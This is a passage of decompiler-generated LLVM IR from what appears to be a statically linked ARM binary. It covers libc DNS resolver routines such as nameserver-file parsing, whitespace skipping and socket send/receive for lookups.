  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1c9a0 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_1c9a0, i1* %cpsr_c.global-to-local, align 1
  %v7_1c9a0 = icmp eq i32 %stack_var_-488.2, -1
  %v2_1c9a4 = inttoptr i32 %v0_1c994 to i32*
  store i32 -1, i32* %v2_1c9a4, align 4
  br i1 %v7_1c9a0, label %dec_label_pc_1c9b4, label %dec_label_pc_1c9ac

dec_label_pc_1c9ac:                               ; preds = %dec_label_pc_1c994, %dec_label_pc_1c660
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1c994 ], [ %v1_1c28c, %dec_label_pc_1c660 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1c994 ], [ %v3_1c514, %dec_label_pc_1c660 ]
  %v1_1c9b0 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1c9b4

dec_label_pc_1c9b4:                               ; preds = %dec_label_pc_1c994, %dec_label_pc_1c9ac
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1c994 ], [ %stack_var_-472.2, %dec_label_pc_1c9ac ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1c9b8 = call i32 @free()
  %v0_1c9bc = load i32, i32* @sl, align 4
  store i32 %v0_1c9bc, i32* @r0, align 4
  %v0_1c9c0 = call i32 @free()
  br label %dec_label_pc_1c9cc

dec_label_pc_1c9cc:                               ; preds = %bb231, %dec_label_pc_1c9b4
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1c9b4 ], [ %v5_1c59c, %bb231 ]
  store i32 %v3_1c230, i32* @r4, align 4
  store i32 %v6_1c230, i32* @r5, align 4
  store i32 %v9_1c230, i32* @r6, align 4
  store i32 %v12_1c230, i32* @r7, align 4
  store i32 %v15_1c230, i32* @r8, align 4
  store i32 %v18_1c230, i32* @sb, align 4
  store i32 %v21_1c230, i32* @sl, align 4
  store i32 %v24_1c230, i32* @fp, align 4
  store i32 %v27_1c230, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1c978, { 1, 2, 0 }
  uselistorder i32 %v1_1c920, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1c8d4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1c890, { 1, 0, 2 }
  uselistorder i32 %v2_1c7c8, { 1, 0 }
  uselistorder i32 %v5_1c7a0, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1c760, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_1c75c, { 1, 0 }
  uselistorder i32 %v2_1c740, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1c73c, { 1, 0 }
  uselistorder i32 %v1_1c738, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1c6b8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1c694, { 1, 0 }
  uselistorder i32 %v3_1c688, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1c688, { 0, 2, 1 }
  uselistorder i32 %v2_1c678, { 0, 2, 1 }
  uselistorder i1 %v7_1c5ac, { 1, 0 }
  uselistorder i32 %v1_1c5ac, { 1, 0 }
  uselistorder i32 %v0_1c5ac, { 1, 0 }
  uselistorder i32 %v5_1c59c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1c514, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_1c4cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1c458, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1c440, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1c434, { 1, 0 }
  uselistorder i32 %v0_1c428, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_1c3e0, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_1c330, { 1, 0 }
  uselistorder i32 %v1_1c334, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_1c6f0, { 1, 0, 2 }
  uselistorder i32 %v1_1c600, { 2, 0, 1 }
  uselistorder i32 %v2_1c488, { 1, 0, 2 }
  uselistorder i32 %v2_1c460, { 1, 0 }
  uselistorder i32 %v0_1c2a8, { 1, 0, 2 }
  uselistorder i32 %v1_1c28c, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_1c258, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1c244, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 20, 21, 1, 54, 22, 23, 24, 25, 26, 27, 28, 46, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 29, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 22, 3, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 2, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @__GI_close, { 18, 17, 19, 24, 23, 22, 21, 14, 13, 20, 15, 16, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 2, 1, 3, 4 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 2, 16, 0, 13, 9, 11, 4, 5, 6, 7, 1, 3, 14, 15, 10, 8, 12, 18, 17 }
  uselistorder i32 1000, { 5, 3, 6, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 5, 4, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 4, 5, 1, 2, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 3, 8, 7, 0, 6, 5, 4, 1, 9, 2 }
  uselistorder i32 17, { 1, 9, 2, 11, 3, 12, 4, 13, 5, 14, 0, 17, 10, 6, 7, 15, 8, 16, 18 }
  uselistorder i32 76, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 2, 13, 14, 18, 19, 20, 21, 15, 16, 17, 3, 22 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 26460, { 1, 0, 2, 3 }
  uselistorder i32 512, { 3, 12, 2, 13, 1, 8, 9, 10, 11, 7, 0, 6, 5, 4, 14 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c9cc, { 1, 0 }
  uselistorder label %dec_label_pc_1c9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1c994, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c98c, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1c974, { 1, 0 }
  uselistorder label %dec_label_pc_1c964, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1c93c, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1c914, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1c86c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c7f8, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1c70c, { 1, 0 }
  uselistorder label %dec_label_pc_1c6b8, { 1, 0 }
  uselistorder label %dec_label_pc_1c688, { 1, 0 }
  uselistorder label %dec_label_pc_1c660, { 1, 0 }
  uselistorder label %dec_label_pc_1c5ac, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_1c408, { 1, 0 }
  uselistorder label %dec_label_pc_1c3cc, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1c9dc:
  %v0_1c9dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c9dc, label %.thread7, label %.thread13

.thread7:                                         ; preds = %dec_label_pc_1c9dc
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %dec_label_pc_1c9dc
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 676, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1ca70 = load i32, i32* @r4, align 4
  store i32 %v3_1ca70, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @ip, align 4
  store i32 676, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1ca80.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1ca809 = inttoptr i32 %v0_1ca80.pre to i8*
  %v2_1ca8010 = load i8, i8* %v1_1ca809, align 1
  %v2_1ca8412 = icmp eq i8 %v2_1ca8010, 0
  store i1 %v2_1ca8412, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ca8412, label %dec_label_pc_1cab4, label %dec_label_pc_1ca90

dec_label_pc_1ca90:                               ; preds = %entry, %bb8.dec_label_pc_1ca90_crit_edge
  %v1_1ca90 = phi i32 [ %v1_1ca90.pre, %bb8.dec_label_pc_1ca90_crit_edge ], [ 676, %entry ]
  %v0_1ca90 = phi i32 [ %v0_1ca90.pre, %bb8.dec_label_pc_1ca90_crit_edge ], [ ptrtoint (i32* @global_var_2a010.835 to i32), %entry ]
  %v2_1ca8016 = phi i8 [ %v2_1ca80, %bb8.dec_label_pc_1ca90_crit_edge ], [ %v2_1ca8010, %entry ]
  %v2_1ca8817.in.in = phi i8 [ %v2_1ca80, %bb8.dec_label_pc_1ca90_crit_edge ], [ %v2_1ca8010, %entry ]
  %v1_1ca8015 = phi i8* [ %v1_1ca80, %bb8.dec_label_pc_1ca90_crit_edge ], [ %v1_1ca809, %entry ]
  %v2_1caa814 = phi i32 [ %v2_1caac, %bb8.dec_label_pc_1ca90_crit_edge ], [ %v0_1ca80.pre, %entry ]
  %v2_1ca8817.in = zext i8 %v2_1ca8817.in.in to i32
  %v2_1ca8817 = mul nuw nsw i32 %v2_1ca8817.in, 2
  %v2_1ca90 = add i32 %v1_1ca90, %v0_1ca90
  %v3_1ca90 = inttoptr i32 %v2_1ca90 to i32*
  %v4_1ca90 = load i32, i32* %v3_1ca90, align 4
  %v2_1ca94 = add i32 %v4_1ca90, %v2_1ca8817
  %v3_1ca94 = inttoptr i32 %v2_1ca94 to i16*
  %v4_1ca94 = load i16, i16* %v3_1ca94, align 2
  %v1_1ca98 = and i16 %v4_1ca94, 32
  %v2_1ca98 = icmp eq i16 %v1_1ca98, 0
  store i1 %v2_1ca98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ca98, label %dec_label_pc_1cab4, label %dec_label_pc_1caa0

dec_label_pc_1caa0:                               ; preds = %dec_label_pc_1ca90
  %v7_1caa0 = icmp eq i8 %v2_1ca8016, 35
  br i1 %v7_1caa0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1caa0
  %v8_1caa4 = icmp eq i8 %v2_1ca8016, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_1caa0, %bb
  %storemerge = phi i1 [ %v8_1caa4, %bb ], [ %v7_1caa0, %dec_label_pc_1caa0 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1caa8 = load i32, i32* %lr.global-to-local, align 4
  %v1_1caa8 = trunc i32 %v0_1caa8 to i8
  store i8 %v1_1caa8, i8* %v1_1ca8015, align 1
  %v0_1caac = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1cab8.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1caac, label %dec_label_pc_1cab4, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1caac = add i32 %v1_1cab8.pre, 1
  store i32 %v2_1caac, i32* %r0.global-to-local, align 4
  %v1_1ca80 = inttoptr i32 %v2_1caac to i8*
  %v2_1ca80 = load i8, i8* %v1_1ca80, align 1
  %v2_1ca84 = icmp eq i8 %v2_1ca80, 0
  store i1 %v2_1ca84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ca84, label %dec_label_pc_1cab4, label %bb8.dec_label_pc_1ca90_crit_edge

bb8.dec_label_pc_1ca90_crit_edge:                 ; preds = %bb8
  %v0_1ca90.pre = load i32, i32* @ip, align 4
  %v1_1ca90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ca90

dec_label_pc_1cab4:                               ; preds = %bb8, %dec_label_pc_1ca90, %bb7, %entry
  %v1_1cab8 = phi i32 [ %v0_1ca80.pre, %entry ], [ %v1_1cab8.pre, %bb7 ], [ %v2_1caa814, %dec_label_pc_1ca90 ], [ %v2_1caac, %bb8 ]
  %v2_1cab4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1cab4, i32* @r4, align 4
  ret i32 %v1_1cab8

; uselistorder directives
  uselistorder i8 %v2_1ca80, { 2, 1, 0 }
  uselistorder i8* %v1_1ca80, { 1, 0 }
  uselistorder i32 %v2_1caac, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1ca98, { 1, 0 }
  uselistorder i8 %v2_1ca8016, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 676, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_1cab4, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_1ca90, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1cac4 = load i32, i32* @r4, align 4
  store i32 %v3_1cac4, i32* %stack_var_-36, align 4
  %v15_1cac4 = load i32, i32* @r8, align 4
  %v18_1cac4 = load i32, i32* @sb, align 4
  %v21_1cac4 = load i32, i32* @sl, align 4
  %v24_1cac4 = load i32, i32* @fp, align 4
  %v27_1cac4 = load i32, i32* @lr, align 4
  store i32 27492, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  %v4_1cad4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 27492) to i32*), align 4
  store i32 %v4_1cad4, i32* @r4, align 4
  %v2_1cad8 = icmp eq i32 %v4_1cad4, 0
  br i1 %v2_1cad8, label %dec_label_pc_1cae4, label %dec_label_pc_1cb14

dec_label_pc_1cae4:                               ; preds = %entry
  %v2_1cae8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1cae8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34336), i32* %r0.global-to-local, align 4
  %v2_1caf0 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34336), i32 %v2_1cae8)
  store i32 %v2_1caf0, i32* %r0.global-to-local, align 4
  %v2_1caf4 = icmp eq i32 %v2_1caf0, 0
  %v1_1caf8 = load i32, i32* @r4, align 4
  %.v1_1caf8 = select i1 %v2_1caf4, i32 %tmp38, i32 %v1_1caf8
  store i32 26488, i32* %r1.global-to-local, align 4
  store i32 %.v1_1caf8, i32* %r2.global-to-local, align 4
  %v0_1cb04 = load i32, i32* @r5, align 4
  %v2_1cb04 = add i32 %v0_1cb04, 26488
  %v3_1cb04 = inttoptr i32 %v2_1cb04 to i32*
  %v4_1cb04 = load i32, i32* %v3_1cb04, align 4
  store i32 %v4_1cb04, i32* %r3.global-to-local, align 4
  %v9_1cb08 = icmp eq i32 %v4_1cb04, %.v1_1caf8
  br i1 %v9_1cb08, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_1cae4
  store i32 %.v1_1caf8, i32* %v3_1cb04, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1cae4, %bb
  store i32 117524, i32* @lr, align 4
  %v1_1cb10 = xor i1 %v9_1cb08, true
  call void @__pseudo_cond_branch(i1 %v1_1cb10, i32 ptrtoint (i32* @global_var_1cf20.1209 to i32))
  %v0_1cb18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cb14

dec_label_pc_1cb14:                               ; preds = %entry, %bb58
  %v2_1cb2c = phi i32 [ ptrtoint (i32* @global_var_2a010.835 to i32), %entry ], [ %v0_1cb18.pre, %bb58 ]
  store i32 27504, i32* %r3.global-to-local, align 4
  %v2_1cb18 = add i32 %v2_1cb2c, 27504
  %v3_1cb18 = inttoptr i32 %v2_1cb18 to i32*
  %v4_1cb18 = load i32, i32* %v3_1cb18, align 4
  store i32 %v4_1cb18, i32* %r3.global-to-local, align 4
  %v2_1cb1c = icmp eq i32 %v4_1cb18, 0
  br i1 %v2_1cb1c, label %dec_label_pc_1cb24, label %dec_label_pc_1ceb8

dec_label_pc_1cb24:                               ; preds = %dec_label_pc_1cb14
  %v4_1cb2c = add i32 %v2_1cb2c, 1274
  %v5_1cb2c = inttoptr i32 %v4_1cb2c to i8*
  store i8 5, i8* %v5_1cb2c, align 1
  store i32 -34336, i32* %r0.global-to-local, align 4
  store i32 1275, i32* %r3.global-to-local, align 4
  store i32 -35312, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_1cb40 = load i32, i32* @r5, align 4
  %v4_1cb40 = add i32 %v2_1cb40, 1275
  %v5_1cb40 = inttoptr i32 %v4_1cb40 to i8*
  store i8 3, i8* %v5_1cb40, align 1
  %v0_1cb44 = load i32, i32* @r5, align 4
  %v1_1cb44 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cb44 = add i32 %v1_1cb44, %v0_1cb44
  store i32 %v2_1cb44, i32* @r0, align 4
  %v1_1cb48 = load i32, i32* %r1.global-to-local, align 4
  %v2_1cb48 = add i32 %v1_1cb48, %v0_1cb44
  store i32 %v2_1cb48, i32* @r1, align 4
  %v2_1cb4c = call i32 @__GI_fopen(i32 %v2_1cb44, i32 %v2_1cb48)
  store i32 %v2_1cb4c, i32* %r0.global-to-local, align 4
  store i32 %v2_1cb4c, i32* @fp, align 4
  %v2_1cb50 = icmp eq i32 %v2_1cb4c, 0
  br i1 %v2_1cb50, label %dec_label_pc_1cddc, label %dec_label_pc_1cd84

dec_label_pc_1cb5c:                               ; preds = %dec_label_pc_1cd84, %dec_label_pc_1cdb8.backedge
  store i32 %v2_1cdb8, i32* %r0.global-to-local, align 4
  %v2_1cb60 = call i32 @skip_and_NUL_space(i8* %v1_1cb60)
  store i32 %v2_1cb60, i32* %r0.global-to-local, align 4
  store i32 %v2_1cb60, i32* @r4, align 4
  %v0_1cb68 = call i32 @skip_nospace()
  store i32 %v0_1cb68, i32* %r0.global-to-local, align 4
  %v1_1cb6c = inttoptr i32 %v0_1cb68 to i8*
  %v2_1cb6c = call i32 @skip_and_NUL_space(i8* %v1_1cb6c)
  store i32 %v2_1cd88, i32* @r1, align 4
  store i32 %v2_1cb6c, i32* @r7, align 4
  %v0_1cb78 = load i32, i32* @r4, align 4
  store i32 %v0_1cb78, i32* %r0.global-to-local, align 4
  %v2_1cb7c = inttoptr i32 %v0_1cb78 to i8*
  %v3_1cb7c = call i32 @__GI_strcoll(i8* %v2_1cb7c, i32 %v2_1cd88)
  store i32 %v3_1cb7c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1cb7c, 16777216
  %v1_1cb80 = sdiv i32 %sext, 16777216
  store i32 %v1_1cb80, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1cb88, label %dec_label_pc_1cc44

dec_label_pc_1cb88:                               ; preds = %dec_label_pc_1cb5c
  %v0_1cb88 = load i32, i32* @r7, align 4
  store i32 %v0_1cb88, i32* %r0.global-to-local, align 4
  %v0_1cb8c = call i32 @skip_nospace()
  %v1_1cb8c = inttoptr i32 %v0_1cb8c to i8*
  store i32 %v2_1cb90, i32* @r4, align 4
  %v0_1cb94 = load i32, i32* @r6, align 4
  %v1_1cb94 = trunc i32 %v0_1cb94 to i8
  store i8 %v1_1cb94, i8* %v1_1cb8c, align 1
  %v0_1cb98 = load i32, i32* @r6, align 4
  store i32 %v0_1cb98, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_1cb90, i32* %r0.global-to-local, align 4
  %v3_1cba4 = call i32 @__GI_memset(i8* %v2_1cba4, i32 %v0_1cb98)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1cbac = load i32, i32* @r7, align 4
  store i32 %v0_1cbac, i32* %r1.global-to-local, align 4
  store i32 %v2_1cbb0, i32* %r2.global-to-local, align 4
  %v3_1cbb4 = inttoptr i32 %v0_1cbac to i8*
  %v4_1cbb4 = call i32 @inet_pton(i32 10, i8* %v3_1cbb4, i32 %v2_1cbb0)
  store i32 %v4_1cbb4, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_1cbb4, 1
  br i1 %tmp59, label %dec_label_pc_1cbc4, label %dec_label_pc_1cbe0

dec_label_pc_1cbc4:                               ; preds = %dec_label_pc_1cb88
  %v0_1cbc4 = load i32, i32* @r7, align 4
  store i32 %v0_1cbc4, i32* %r1.global-to-local, align 4
  store i32 %v2_1cbc8, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_1cbd0 = inttoptr i32 %v0_1cbc4 to i8*
  %v4_1cbd0 = call i32 @inet_pton(i32 2, i8* %v3_1cbd0, i32 %v2_1cbc8)
  store i32 %v4_1cbd0, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_1cbd0, 1
  br i1 %tmp60, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1cbe0

dec_label_pc_1cbe0:                               ; preds = %dec_label_pc_1cbc4, %dec_label_pc_1cb88
  %v0_1cbe4.off0 = phi i16 [ 10, %dec_label_pc_1cb88 ], [ 2, %dec_label_pc_1cbc4 ]
  store i32 %v2_1cbe0, i32* %r2.global-to-local, align 4
  store i16 %v0_1cbe4.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 27504, i32* @r7, align 4
  %v0_1cbf4 = load i32, i32* @r5, align 4
  %v2_1cbf4 = add i32 %v0_1cbf4, 27504
  %v3_1cbf4 = inttoptr i32 %v2_1cbf4 to i32*
  %v4_1cbf4 = load i32, i32* %v3_1cbf4, align 4
  store i32 27500, i32* @sl, align 4
  %v1_1cbfc = add i32 %v4_1cbf4, 1
  store i32 %v1_1cbfc, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1cc04 = mul i32 %v1_1cbfc, 28
  store i32 %v2_1cc04, i32* %r1.global-to-local, align 4
  %v2_1cc08 = add i32 %v0_1cbf4, 27500
  %v3_1cc08 = inttoptr i32 %v2_1cc08 to i32*
  %v4_1cc08 = load i32, i32* %v3_1cc08, align 4
  store i32 %v4_1cc08, i32* %r0.global-to-local, align 4
  %v2_1cc0c = inttoptr i32 %v4_1cc08 to i32*
  %v3_1cc0c = call i32 @realloc(i32* %v2_1cc0c, i32 %v2_1cc04)
  store i32 %v3_1cc0c, i32* %r0.global-to-local, align 4
  store i32 %v3_1cc0c, i32* @r6, align 4
  %v2_1cc10 = icmp eq i32 %v3_1cc0c, 0
  br i1 %v2_1cc10, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1cc18

dec_label_pc_1cc18:                               ; preds = %dec_label_pc_1cbe0
  %v0_1cc18 = load i32, i32* @r5, align 4
  %v1_1cc18 = load i32, i32* @r7, align 4
  %v2_1cc18 = add i32 %v1_1cc18, %v0_1cc18
  %v3_1cc18 = inttoptr i32 %v2_1cc18 to i32*
  %v4_1cc18 = load i32, i32* %v3_1cc18, align 4
  store i32 %v4_1cc18, i32* %r4.global-to-local, align 4
  %v1_1cc1c = load i32, i32* @r8, align 4
  %v3_1cc1c = mul i32 %v1_1cc1c, %v4_1cc18
  %v4_1cc1c = add i32 %v3_1cc1c, %v3_1cc0c
  store i32 %v4_1cc1c, i32* %lr.global-to-local, align 4
  %v2_1cc24 = load i16, i16* %stack_var_-68, align 2
  %v3_1cc24 = sext i16 %v2_1cc24 to i32
  store i32 %v3_1cc24, i32* %r0.global-to-local, align 4
  %v6_1cc24 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1cc24, i32* %r1.global-to-local, align 4
  %v9_1cc24 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1cc24, i32* %r2.global-to-local, align 4
  store i32 %v14_1cc24, i32* @ip, align 4
  %v2_1cc28 = load i32, i32* @sl, align 4
  %v3_1cc28 = add i32 %v2_1cc28, %v0_1cc18
  %v4_1cc28 = inttoptr i32 %v3_1cc28 to i32*
  store i32 %v3_1cc0c, i32* %v4_1cc28, align 4
  %v0_1cc2c = load i32, i32* %lr.global-to-local, align 4
  %v1_1cc2c = inttoptr i32 %v0_1cc2c to i32*
  %v2_1cc2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1cc2c, i32* %v1_1cc2c, align 4
  %v3_1cc2c = add i32 %v0_1cc2c, 4
  %v4_1cc2c = inttoptr i32 %v3_1cc2c to i32*
  %v5_1cc2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1cc2c, i32* %v4_1cc2c, align 4
  %v6_1cc2c = add i32 %v0_1cc2c, 8
  %v7_1cc2c = inttoptr i32 %v6_1cc2c to i32*
  %v8_1cc2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1cc2c, i32* %v7_1cc2c, align 4
  %v9_1cc2c = add i32 %v0_1cc2c, 12
  %v10_1cc2c = inttoptr i32 %v9_1cc2c to i32*
  %v11_1cc2c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1cc2c, i32* %v10_1cc2c, align 4
  %v12_1cc2c = add i32 %v0_1cc2c, 16
  store i32 %v12_1cc2c, i32* @lr, align 4
  %v2_1cc30 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_1cc30, i32* %r0.global-to-local, align 4
  %v0_1cc34 = load i32, i32* %r4.global-to-local, align 4
  %v1_1cc34 = add i32 %v0_1cc34, 1
  store i32 %v1_1cc34, i32* %r4.global-to-local, align 4
  %v1_1cc38 = inttoptr i32 %v12_1cc2c to i32*
  store i32 %v2_1cc30, i32* %v1_1cc38, align 4
  %v3_1cc38 = add i32 %v0_1cc2c, 20
  %v4_1cc38 = inttoptr i32 %v3_1cc38 to i32*
  %v5_1cc38 = load i32, i32* %r1.global-to-local, align 4
